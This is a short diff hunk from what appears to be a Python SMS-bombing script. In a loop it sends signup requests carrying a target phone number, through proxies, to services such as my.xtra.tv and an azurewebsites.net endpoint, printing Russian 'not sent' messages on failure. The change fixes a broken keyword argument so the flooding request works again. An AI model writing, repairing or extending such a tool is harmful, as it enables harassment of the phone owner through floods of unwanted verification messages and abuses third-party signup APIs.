@@ -101,7 +101,7 @@ for _ in track(range(run)):
  except:
          print('Не отправлено (azurewebsites.net)')
  try:
-         requests.post("https://my.xtra.tv/api/signup?lang=uk", ={"phone": number}, headers=headers, proxies=proxies)
+         requests.post("https://my.xtra.tv/api/signup?lang=uk", json={"phone": number}, headers=headers, proxies=proxies)
          print('my.xtra.tv')
  except:
          print('Не отправлено (my.xtra.tv)')
